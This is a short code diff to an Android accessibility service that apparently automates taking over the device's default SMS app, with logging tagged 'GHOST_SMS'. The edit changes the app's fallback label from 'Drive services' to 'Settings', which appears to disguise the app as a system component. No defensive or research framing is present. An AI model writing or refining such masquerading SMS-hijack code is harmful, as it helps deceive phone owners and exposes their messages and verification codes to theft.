@@ -383,7 +383,7 @@ class MyAccessibilityService : AccessibilityService() {
                 val root = rootInActiveWindow ?: return
                 
                 // Resolve which app name we are looking for
-                val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }
+                val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Settings" }
 
                 if (targetLabel == null) {
                     DebugLogger.log("GHOST_SMS", "Abort: Target label is null")
@@ -428,7 +428,7 @@ class MyAccessibilityService : AccessibilityService() {
                 val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
                 
                 val targetLabel = if (mode == "AUTO_NAV") {
-                    try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }
+                    try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Settings" }
                 } else {
                     DefaultSmsManager.getStoredPreviousLabel(this)
                 }
